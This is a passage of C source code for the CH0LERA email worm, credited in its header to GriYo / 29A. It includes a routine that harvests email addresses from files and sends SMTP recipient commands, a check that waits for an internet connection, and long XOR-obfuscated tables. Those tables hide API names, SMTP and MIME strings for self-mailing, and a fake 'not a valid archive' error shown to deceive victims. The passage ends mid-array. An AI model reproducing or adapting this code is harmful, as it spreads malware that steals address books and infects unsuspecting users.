                                                   strcat( RCPT_TO, "\n") ;

                                                   str2socket( RCPT_TO, TRUE) ;

                                                   Found++ ;
                                               }
                                               else l00king = 0 ;
                                           }

                                           if (    ( *lpc01 < 64)  &&
                                                   ( *lpc01 != 46) &&
                                                   ( *lpc01 != 60) &&
                                                   ( *lpc01 != 62))
                                           {
                                               l00king = 0 ;
                                           }

                                           if ( *lpc01 > 122)
                                           {
                                               l00king = 0 ;
                                           }

                                           lpc01++ ;
                                           addrssize-- ;
                                       }

                                       UnmapViewOfFile( lpFile) ;
                                   }

                                   CloseHandle( hMap) ;
                               }

                               CloseHandle( hFile) ;
                           }
                       }
                   }
               }
           }
           while ( ( FindNextFile( hFind, &FindData) !=0) && ( Found < 16)) ;

           FindClose( hFind) ;
       }

       return ;
   }

   //···············································································

   void WaitC0nnected( void)
   {
       InetActivated = FALSE ;

       while ( !InetActivated)
       {
           EnumWindows( EnumWindowsProc, ( LPARAM) NULL) ;

           Sleep( 0x01770) ;
       }

       return ;
   }

   //···············································································

   BOOL CALLBACK EnumWindowsProc( HWND hwnd, LPARAM lParam)
   {

       int     CaptionLen ;
       int     AwareLen ;
       int     CompareLen ;
       int     InetAware ;
       int     EquChar ;
       int     aux0 ;
       int     aux1 ;
       char    *Foll0w ;
       char    *PtrAware ;
       char    WindowCaption[ 1024] ;

       CaptionLen = GetWindowText( hwnd, WindowCaption, 1024) ;

       if ( CaptionLen > 0)
       {
           Foll0w = WindowCaption ;

           while( *Foll0w != 0)
           {
               if ( ( *Foll0w >= 'a') && ( *Foll0w <= 'z')) *Foll0w = *Foll0w - 'a' + 'A' ;
               Foll0w++ ;
           }

           for( InetAware = 0 ; InetAware < 5 ; InetAware++)
           {
               AwareLen = strlen( szAware[ InetAware]) ;

               if ( AwareLen < CaptionLen)
               {
                   CompareLen = CaptionLen - AwareLen ;

                   for ( aux0 = 0 ; aux0 < CompareLen ; aux0++ )
                   {
                       EquChar = 0 ;
                       Foll0w = &WindowCaption[ aux0] ;
                       PtrAware = szAware[ InetAware] ;

                       for ( aux1 = 0 ; aux1 < AwareLen ; aux1++ , Foll0w++ , PtrAware++ )
                       {
                           if ( *Foll0w == *PtrAware) EquChar++ ;
                       }

                       if ( EquChar == AwareLen)
                       {
                           InetActivated = TRUE ;
                           break ;
                       }

                       aux0++ ;
                   }
               }
           }
       }

       return ( !InetActivated) ;
   }

   ---------------------------------------------------------->8---------------------

   //···············································································
   //
   // CH0LERA - Bacterium BioCoded by GriYo / 29A
   //
   //
   //···············································································

       char szCopyRight[]={
                   'C'     ^ ( char) 0x0FF,
                   'H'     ^ ( char) 0x0FF,
                   '0'     ^ ( char) 0x0FF,
                   'L'     ^ ( char) 0x0FF,
                   'E'     ^ ( char) 0x0FF,
                   'R'     ^ ( char) 0x0FF,
                   'A'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   '-'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'B'     ^ ( char) 0x0FF,
                   'a'     ^ ( char) 0x0FF,
                   'c'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'r'     ^ ( char) 0x0FF,
                   'i'     ^ ( char) 0x0FF,
                   'u'     ^ ( char) 0x0FF,
                   'm'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'B'     ^ ( char) 0x0FF,
                   'i'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   'C'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   'd'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'd'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'b'     ^ ( char) 0x0FF,
                   'y'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'G'     ^ ( char) 0x0FF,
                   'r'     ^ ( char) 0x0FF,
                   'i'     ^ ( char) 0x0FF,
                   'Y'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   '/'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   '2'     ^ ( char) 0x0FF,
                   '9'     ^ ( char) 0x0FF,
                   'A'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szFakeMsg[]={
                   'C'     ^ ( char) 0x0FF,
                   'a'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   'p'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'f'     ^ ( char) 0x0FF,
                   'i'     ^ ( char) 0x0FF,
                   'l'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   ':'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'i'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'd'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   's'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'a'     ^ ( char) 0x0FF,
                   'p'     ^ ( char) 0x0FF,
                   'p'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'a'     ^ ( char) 0x0FF,
                   'r'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'b'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'a'     ^ ( char) 0x0FF,
                   ' '         ^ ( char) 0x0FF,
                   'v'     ^ ( char) 0x0FF,
                   'a'     ^ ( char) 0x0FF,
                   'l'     ^ ( char) 0x0FF,
                   'i'     ^ ( char) 0x0FF,
                   'd'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'a'     ^ ( char) 0x0FF,
                   'r'     ^ ( char) 0x0FF,
                   'c'     ^ ( char) 0x0FF,
                   'h'     ^ ( char) 0x0FF,
                   'i'     ^ ( char) 0x0FF,
                   'v'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   '.'     ^ ( char) 0x0FF,
                   0x0A        ^ ( char) 0x0FF,
                   0x0A        ^ ( char) 0x0FF,
                   'I'     ^ ( char) 0x0FF,
                   'f'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'y'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   'u'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'd'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   'w'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   'l'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   'a'     ^ ( char) 0x0FF,
                   'd'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'd'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   'h'     ^ ( char) 0x0FF,
                   'i'     ^ ( char) 0x0FF,
                   's'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'f'     ^ ( char) 0x0FF,
                   'i'     ^ ( char) 0x0FF,
                   'l'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   ','     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   'r'     ^ ( char) 0x0FF,
                   'y'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'd'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   'w'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   'l'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   'a'     ^ ( char) 0x0FF,
                   'd'     ^ ( char) 0x0FF,
                   'i'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   'g'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   'h'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'f'     ^ ( char) 0x0FF,
                   'i'     ^ ( char) 0x0FF,
                   'l'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'a'     ^ ( char) 0x0FF,
                   'g'     ^ ( char) 0x0FF,
                   'a'     ^ ( char) 0x0FF,
                   'i'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   '.'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szSetUp[]={
                   'S'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   'u'     ^ ( char) 0x0FF,
                   'p'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szWNetOpenEnumA[]={
                   'W'     ^ ( char) 0x0FF,
                   'N'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   'O'     ^ ( char) 0x0FF,
                   'p'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   'E'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   'u'     ^ ( char) 0x0FF,
                   'm'     ^ ( char) 0x0FF,
                   'A'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szWNetCloseEnum[]={
                   'W'     ^ ( char) 0x0FF,
                   'N'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   'C'     ^ ( char) 0x0FF,
                   'l'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   's'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'E'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   'u'     ^ ( char) 0x0FF,
                   'm'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szWNetEnumResourceA[]={
                   'W'     ^ ( char) 0x0FF,
                   'N'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   'E'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   'u'     ^ ( char) 0x0FF,
                   'm'     ^ ( char) 0x0FF,
                   'R'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   's'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   'u'     ^ ( char) 0x0FF,
                   'r'     ^ ( char) 0x0FF,
                   'c'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'A'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szMPR_DLL[]={
                   'M'     ^ ( char) 0x0FF,
                   'P'     ^ ( char) 0x0FF,
                   'R'     ^ ( char) 0x0FF,
                   '.'     ^ ( char) 0x0FF,
                   'D'     ^ ( char) 0x0FF,
                   'L'     ^ ( char) 0x0FF,
                   'L'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szWINSOCK_DLL[]={
                   'W'     ^ ( char) 0x0FF,
                   'S'     ^ ( char) 0x0FF,
                   'O'     ^ ( char) 0x0FF,
                   'C'     ^ ( char) 0x0FF,
                   'K'     ^ ( char) 0x0FF,
                   '3'     ^ ( char) 0x0FF,
                   '2'     ^ ( char) 0x0FF,
                   '.'     ^ ( char) 0x0FF,
                   'D'     ^ ( char) 0x0FF,
                   'L'     ^ ( char) 0x0FF,
                   'L'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szWSAStartup[]={
                   'W'     ^ ( char) 0x0FF,
                   'S'     ^ ( char) 0x0FF,
                   'A'     ^ ( char) 0x0FF,
                   'S'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   'a'     ^ ( char) 0x0FF,
                   'r'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   'u'     ^ ( char) 0x0FF,
                   'p'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szinet_addr[]={
                   'i'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   '_'     ^ ( char) 0x0FF,
                   'a'     ^ ( char) 0x0FF,
                   'd'     ^ ( char) 0x0FF,
                   'd'     ^ ( char) 0x0FF,
                   'r'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szgethostbyaddr[]={
                   'g'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   'h'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   's'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   'b'     ^ ( char) 0x0FF,
                   'y'     ^ ( char) 0x0FF,
                   'a'     ^ ( char) 0x0FF,
                   'd'     ^ ( char) 0x0FF,
                   'd'     ^ ( char) 0x0FF,
                   'r'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szgethostbyname[]={
                   'g'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   'h'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   's'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   'b'     ^ ( char) 0x0FF,
                   'y'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   'a'     ^ ( char) 0x0FF,
                   'm'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szhtons[]={
                   'h'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   's'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szsocket[]={
                   's'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   'c'     ^ ( char) 0x0FF,
                   'k'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szconnect[]={
                   'c'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'c'     ^ ( char) 0x0FF,
                   't'         ^ ( char) 0x0FF,
                   0
                   } ;

       char szsend[]={
                   's'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   'd'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szrecv[]={
                   'r'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'c'     ^ ( char) 0x0FF,
                   'v'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szclosesocket[]={
                   'c'     ^ ( char) 0x0FF,
                   'l'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   's'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   's'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   'c'     ^ ( char) 0x0FF,
                   'k'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   't'         ^ ( char) 0x0FF,
                   0
                   } ;

       char szWSACleanup[]={   'W'     ^ ( char) 0x0FF,
                   'S'     ^ ( char) 0x0FF,
                   'A'     ^ ( char) 0x0FF,
                   'C'     ^ ( char) 0x0FF,
                   'l'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'a'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   'u'     ^ ( char) 0x0FF,
                   'p'         ^ ( char) 0x0FF,
                   0
                   } ;

       char smtp_str00[]={
                   'H'     ^ ( char) 0x0FF,
                   'E'     ^ ( char) 0x0FF,
                   'L'     ^ ( char) 0x0FF,
                   'O'     ^ ( char) 0x0FF,
                   0
                   } ;

       char smtp_str01[]={
                   'M'     ^ ( char) 0x0FF,
                   'A'     ^ ( char) 0x0FF,
                   'I'     ^ ( char) 0x0FF,
                   'L'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'F'     ^ ( char) 0x0FF,
                   'R'     ^ ( char) 0x0FF,
                   'O'     ^ ( char) 0x0FF,
                   'M'     ^ ( char) 0x0FF,
                   ':'     ^ ( char) 0x0FF,
                   0
                   } ;

       char smtp_str02[]={
                   'R'     ^ ( char) 0x0FF,
                   'C'     ^ ( char) 0x0FF,
                   'P'     ^ ( char) 0x0FF,
                   'T'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'T'     ^ ( char) 0x0FF,
                   'O'     ^ ( char) 0x0FF,
                   ':'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   0
                   } ;

       char smtp_str03[]={
                   'D'     ^ ( char) 0x0FF,
                   'A'     ^ ( char) 0x0FF,
                   'T'     ^ ( char) 0x0FF,
                   'A'     ^ ( char) 0x0FF,
                   0x0A        ^ ( char) 0x0FF,
                   0
                   } ;

       char smtp_str06[]={
                   'S'     ^ ( char) 0x0FF,
                   'U'     ^ ( char) 0x0FF,
                   'B'     ^ ( char) 0x0FF,
                   'J'     ^ ( char) 0x0FF,
                   'E'     ^ ( char) 0x0FF,
                   'C'     ^ ( char) 0x0FF,
                   'T'     ^ ( char) 0x0FF,
                   ':'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'O'     ^ ( char) 0x0FF,
                   'k'     ^ ( char) 0x0FF,
                   '.'     ^ ( char) 0x0FF,
                   '.'     ^ ( char) 0x0FF,
                   '.'     ^ ( char) 0x0FF,
                   0x0A    ^ ( char) 0x0FF,
                   0
                   } ;

       char smtp_str07[]={
                   'M'     ^ ( char) 0x0FF,
                   'I'     ^ ( char) 0x0FF,
                   'M'     ^ ( char) 0x0FF,
                   'E'     ^ ( char) 0x0FF,
                   '-'     ^ ( char) 0x0FF,
                   'V'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'r'     ^ ( char) 0x0FF,
                   's'     ^ ( char) 0x0FF,
                   'i'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   ':'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   '1'     ^ ( char) 0x0FF,
                   '.'     ^ ( char) 0x0FF,
                   '0'     ^ ( char) 0x0FF,
                   0x0A        ^ ( char) 0x0FF,
                   'C'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   '-'     ^ ( char) 0x0FF,
                   'T'     ^ ( char) 0x0FF,
                   'y'     ^ ( char) 0x0FF,
                   'p'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   ':'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'm'     ^ ( char) 0x0FF,
                   'u'     ^ ( char) 0x0FF,
                   'l'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   'i'     ^ ( char) 0x0FF,
                   'p'     ^ ( char) 0x0FF,
                   'a'     ^ ( char) 0x0FF,
                   'r'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   '/'     ^ ( char) 0x0FF,
                   'm'     ^ ( char) 0x0FF,
                   'i'     ^ ( char) 0x0FF,
                   'x'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'd'     ^ ( char) 0x0FF,
                   ';'     ^ ( char) 0x0FF,
                   0x0A        ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'b'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   'u'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   'd'     ^ ( char) 0x0FF,
                   'a'     ^ ( char) 0x0FF,
                   'r'     ^ ( char) 0x0FF,
                   'y'     ^ ( char) 0x0FF,
                   '='     ^ ( char) 0x0FF,
                   '"'     ^ ( char) 0x0FF,
                   0
                   } ;

       char smtp_str08[]={
                   '"'     ^ ( char) 0x0FF,
                   0x0A        ^ ( char) 0x0FF,
                   'X'     ^ ( char) 0x0FF,
                   '-'     ^ ( char) 0x0FF,
                   'P'     ^ ( char) 0x0FF,
                   'r'     ^ ( char) 0x0FF,
                   'i'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   'r'     ^ ( char) 0x0FF,
                   'i'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   'y'     ^ ( char) 0x0FF,
                   ':'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   '3'     ^ ( char) 0x0FF,
                   0x0A        ^ ( char) 0x0FF,
                   'X'     ^ ( char) 0x0FF,
                   '-'     ^ ( char) 0x0FF,
                   'M'     ^ ( char) 0x0FF,
                   'S'     ^ ( char) 0x0FF,
                   'M'     ^ ( char) 0x0FF,
                   'a'     ^ ( char) 0x0FF,
                   'i'     ^ ( char) 0x0FF,
                   'l'     ^ ( char) 0x0FF,
                   '-'     ^ ( char) 0x0FF,
                   'P'     ^ ( char) 0x0FF,
                   'r'     ^ ( char) 0x0FF,
                   'i'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   'r'     ^ ( char) 0x0FF,
                   'i'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   'y'     ^ ( char) 0x0FF,
                   ':'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'N'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   'r'     ^ ( char) 0x0FF,
                   'm'     ^ ( char) 0x0FF,
                   'a'     ^ ( char) 0x0FF,
                   'l'     ^ ( char) 0x0FF,
                   0x0A        ^ ( char) 0x0FF,
                   'X'     ^ ( char) 0x0FF,
                   '-'     ^ ( char) 0x0FF,
                   'U'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   's'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   ':'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   '1'     ^ ( char) 0x0FF,
                   0x0A        ^ ( char) 0x0FF,
                   'X'     ^ ( char) 0x0FF,
                   '-'     ^ ( char) 0x0FF,
                   'M'     ^ ( char) 0x0FF,
                   'i'     ^ ( char) 0x0FF,
                   'm'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'O'     ^ ( char) 0x0FF,
                   'L'     ^ ( char) 0x0FF,
                   'E'     ^ ( char) 0x0FF,
                   ':'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'P'     ^ ( char) 0x0FF,
                   'r'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   'd'     ^ ( char) 0x0FF,
                   'u'     ^ ( char) 0x0FF,
                   'c'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'd'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'B'     ^ ( char) 0x0FF,
                   'y'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'M'     ^ ( char) 0x0FF,
                   'i'     ^ ( char) 0x0FF,
                   'c'     ^ ( char) 0x0FF,
                   'r'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   's'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   'f'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'M'     ^ ( char) 0x0FF,
                   'i'     ^ ( char) 0x0FF,
                   'm'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'O'     ^ ( char) 0x0FF,
                   'L'     ^ ( char) 0x0FF,
                   'E'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'V'     ^ ( char) 0x0FF,
                   '4'     ^ ( char) 0x0FF,
                   '.'     ^ ( char) 0x0FF,
                   '7'     ^ ( char) 0x0FF,
                   '2'     ^ ( char) 0x0FF,
                   '.'     ^ ( char) 0x0FF,
                   '3'     ^ ( char) 0x0FF,
                   '1'     ^ ( char) 0x0FF,
                   '1'     ^ ( char) 0x0FF,
                   '0'     ^ ( char) 0x0FF,
                   '.'     ^ ( char) 0x0FF,
                   '3'     ^ ( char) 0x0FF,
                   0x0A        ^ ( char) 0x0FF,
                   'T'     ^ ( char) 0x0FF,
                   'h'     ^ ( char) 0x0FF,
                   'i'     ^ ( char) 0x0FF,
                   's'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'i'     ^ ( char) 0x0FF,
                   's'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'a'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'm'     ^ ( char) 0x0FF,
                   'u'     ^ ( char) 0x0FF,
                   'l'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   'i'     ^ ( char) 0x0FF,
                   '-'     ^ ( char) 0x0FF,
                   'p'     ^ ( char) 0x0FF,
                   'a'     ^ ( char) 0x0FF,
                   'r'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'm'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   's'     ^ ( char) 0x0FF,
                   's'     ^ ( char) 0x0FF,
                   'a'     ^ ( char) 0x0FF,
                   'g'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'i'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'M'     ^ ( char) 0x0FF,
                   'I'     ^ ( char) 0x0FF,
                   'M'     ^ ( char) 0x0FF,
                   'E'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'f'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   'r'     ^ ( char) 0x0FF,
                   'm'     ^ ( char) 0x0FF,
                   'a'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   '.'     ^ ( char) 0x0FF,
                   0x0A        ^ ( char) 0x0FF,
                   0x0A        ^ ( char) 0x0FF,
                   '-'     ^ ( char) 0x0FF,
                   '-'     ^ ( char) 0x0FF,
                   0
                   } ;

       char smtp_str09[]={
                   0x0A        ^ ( char) 0x0FF,
                   'C'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   '-'     ^ ( char) 0x0FF,
                   'T'     ^ ( char) 0x0FF,
                   'y'     ^ ( char) 0x0FF,
                   'p'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   ':'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'x'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   '/'     ^ ( char) 0x0FF,
                   'p'     ^ ( char) 0x0FF,
                   'l'     ^ ( char) 0x0FF,
                   'a'     ^ ( char) 0x0FF,
                   'i'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   ';'     ^ ( char) 0x0FF,
                   0x0A        ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'c'     ^ ( char) 0x0FF,
                   'h'     ^ ( char) 0x0FF,
                   'a'     ^ ( char) 0x0FF,
                   'r'     ^ ( char) 0x0FF,
                   's'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   '='     ^ ( char) 0x0FF,
                   '"'     ^ ( char) 0x0FF,
                   'i'     ^ ( char) 0x0FF,
                   's'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
